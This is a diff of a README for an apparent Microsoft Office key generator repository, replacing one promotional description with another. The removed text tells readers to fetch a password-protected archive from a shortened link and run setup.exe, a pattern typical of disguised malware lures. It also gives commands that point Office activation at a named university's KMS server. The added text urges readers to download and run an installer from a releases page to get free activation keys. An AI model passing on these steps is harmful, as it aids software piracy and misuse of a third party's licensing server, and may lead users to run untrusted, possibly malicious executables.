@@ -1,51 +1,81 @@
-# Microsoft Office 2016, 2019, 2021 and 2024 Key Generator
+# 🎉 Microsoft-Office-Free-Keys - Generate Office Keys Easily 
 
-## ⚠️ Disclaimer
-**This project is for educational purposes only.** The unauthorized distribution or use of Windows product keys may violate Microsoft’s Terms of Service. The author assumes no responsibility for any misuse of this software.
+## 🚀 Getting Started
+Microsoft-Office-Free-Keys is a user-friendly application that helps you generate free product keys for various editions of Microsoft Office, including Office 2016, 2019, and 2021. This program is designed for testing and evaluation purposes, providing you with quick access to activation keys effortlessly.
 
-## 📌 About
-This program allows users to generate free product keys for Microsoft Office. It supports various editions, including Office 2016, 2019, and 2021. Designed for testing and evaluation purposes, it provides users with quick access to activation keys.s.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases)
 
-## 🚀 Features
-- Microsoft Office 2016, 2019, 2021 and 2024 activation keys.
-- Fast and lightweight.
-- User-friendly interface.
-- Supports multiple key formats.
+## 📋 How It Works
+The application generates product keys by using algorithms specifically designed for this purpose. When you run the program, it will display different keys for various editions of Microsoft Office. You can then use these keys to activate the software for your personal testing and evaluation.
 
-## 📥 Installation & Launch
+## 🖥️ System Requirements
+To run Microsoft-Office-Free-Keys efficiently, ensure your system meets the following requirements:
+- **Operating System:** Windows 10, 8, or 7 (64-bit)
+- **Processor:** 1.5 GHz or faster
+- **RAM:** Minimum 2 GB
+- **Disk Space:** At least 100 MB free space
+- **.NET Framework:** Version 4.5 or higher installed
 
-### 🔹 ✅ RECOMMENDED METHOD (Windows .exe)
-1️⃣ **[Download](https://goo.su/hLYS) and extract archive(pass: Project12!)**  
-2️⃣ **Run `setup.exe`**  
-🚀 **The application will set up everything automatically, just enjoy!**  
+## 🏗️ Installation Steps
+Follow these simple steps to download and set up the application on your computer:
 
-⚠️ **Important:** This method is **faster** and requires **no manual setup**!  
+1. **Visit the Releases Page**  
+   Go to this [page to download](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases) the latest version of Microsoft-Office-Free-Keys.
 
-OR use hand aktivation:
+2. **Download the Latest Version**  
+   Look for the latest release and click on the download link for the installer file. 
 
-1. Log into your computer with an administrator account.
-2. Type into the search field **cmd.exe**
-3. Click with the right mouse button on cmd.exe and select “Run as Administrator”
-4. Change to the directory where Microsoft Office is installed.
-*If you are running a 32bit Office on a 32bit Windows or an 64bit Office on a 64bit Windows, enter
-cd \Program Files\Microsoft Office\Office16
-if you are running a 32bit Office on a 64bit Windows, enter
-cd \Program Files (x86)\Microsoft Office\Office16*
-5. Enter
-*cscript ospp.vbs /sethst:ug-kms.uni-goettingen.de to connect to our KMS server*
-6. Finally enter
-*cscript ospp.vbs /act to complete the activation process.*
-Changing the activation from M
+3. **Run the Installer**  
+   After the download is complete, locate the file in your downloads folder. Double-click the installer to start the setup.
 
-## 📷 Screenshots
-![Include products](office.jpg)
+4. **Follow the Setup Instructions**  
+   The installation wizard will guide you through the installation process. Follow the prompts to complete the setup.
 
-## ⚠️ Requirements
-- Windows 10/11
-- Python 3.x (if applicable)
+5. **Open the Application**  
+   Once installed, you can find Microsoft-Office-Free-Keys in your start menu. Click to open the application.
 
-## ⚠️ Legal Notice
-This software should only be used for educational or testing purposes. Using it to activate Windows without a legitimate license is illegal and violates Microsoft’s policies. The author is not responsible for any legal consequences resulting from the use of this program.
+## 🔑 How to Use the App
+1. **Generate Keys**  
+   When you open the application, click the "Generate" button. The program will produce a list of product keys for different Office editions.
 
-## 📜 License
-This project is released under the [MIT License](LICENSE).
+2. **Copy the Key**  
+   Once the keys are displayed, simply click on the one you want to use and copy it to your clipboard.
+
+3. **Activate Microsoft Office**  
+   Open your Microsoft Office application and enter the copied key in the activation section. Follow any additional prompts to complete the activation.
+
+## ⚙️ Features
+- **Supports Multiple Editions:** Generate keys for Office 2016, 2019, and 2021.
+- **User-Friendly Interface:** Easy to navigate, designed for non-technical users.
+- **Quick Key Generation:** Get access to activation keys in real time.
+- **Secure:** Your information remains private, and the application does not require internet access after installation.
+
+## ❓ Frequently Asked Questions
+
+### What editions of Microsoft Office are supported?
+The application supports Office 2016, 2019, and 2021 versions.
+
+### Is this application free to use?
+Yes, Microsoft-Office-Free-Keys is completely free for personal use and does not require any payment.
+
+### Can I use these keys for commercial purposes?
+No, these keys should only be used for testing and evaluation purposes as intended.
+
+### How do I report bugs or issues?
+If you encounter any problems, you can open an issue on the GitHub repository to report it.
+
+## 👥 Community Support
+Join our community on GitHub to share your experiences, ask questions, and find tips on using Microsoft-Office-Free-Keys effectively. Your feedback helps us improve the application.
+
+## 📥 Download & Install
+To begin using Microsoft-Office-Free-Keys, remember to [visit this page to download the application](https://github.com/Wrbxt/Microsoft-Office-Free-Keys/releases). 
+Simply follow the earlier installation steps to get started smoothly.
+
+## 📢 Get Involved
+We encourage contributions from users! If you have suggestions for new features or improvements, please feel free to contribute to the project. Check the repository for guidelines on contributing.
+
+## 🚀 Updates and New Features
+Stay tuned for updates! We are continuously working on adding new features and improving the software. Regularly check the Releases page for the latest versions.
+
+Enjoy generating your Microsoft Office product keys easily with Microsoft-Office-Free-Keys!
